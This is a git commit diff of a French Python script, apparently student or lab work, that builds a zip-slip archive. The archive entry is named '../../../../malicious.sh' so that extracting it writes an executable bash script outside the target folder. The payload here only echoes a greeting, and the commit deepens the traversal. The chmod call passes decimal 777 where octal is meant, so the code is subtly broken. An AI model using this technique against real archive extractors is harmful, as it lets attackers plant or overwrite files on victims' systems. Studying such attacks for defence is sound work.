2e08fbbb14c97e13a512dc33c955d2212142f065
alexis.laurent <alexis.laurent@etu.uca.fr>
2024-10-01 11:01:56 +0200

    +

--- Create_EvilZip.py
+++ Create_EvilZip.py
@@ -2,18 +2,18 @@ import zipfile
 import os
 
 # Créer un répertoire temporaire pour le fichier à zipper
-os.makedirs('evil', exist_ok=True)
+os.makedirs('.evil', exist_ok=True)
 
 # Créer un script Bash malveillant
-with open('evil/../../malicious.sh', 'w') as f:
+with open('.evil/../../../../malicious.sh', 'w') as f:
     f.write("#!/bin/bash\n")
     f.write('echo \"Salut c est fanta\"')
 
 # Rendre le script exécutable
-os.chmod('evil/../../malicious.sh', 0o755)
+os.chmod('.evil/../../../../malicious.sh', 777)
 
 # Créer le fichier ZIP avec le script piégé
 with zipfile.ZipFile('evil_zip.zip', 'w') as zipf:
-    zipf.write('evil/../../malicious.sh', arcname='../../malicious.sh')
+    zipf.write('.evil/../../../../malicious.sh', arcname='../../../../malicious.sh')
 
 print("Fichier ZIP piégé créé avec script Bash : evil_zip.zip")
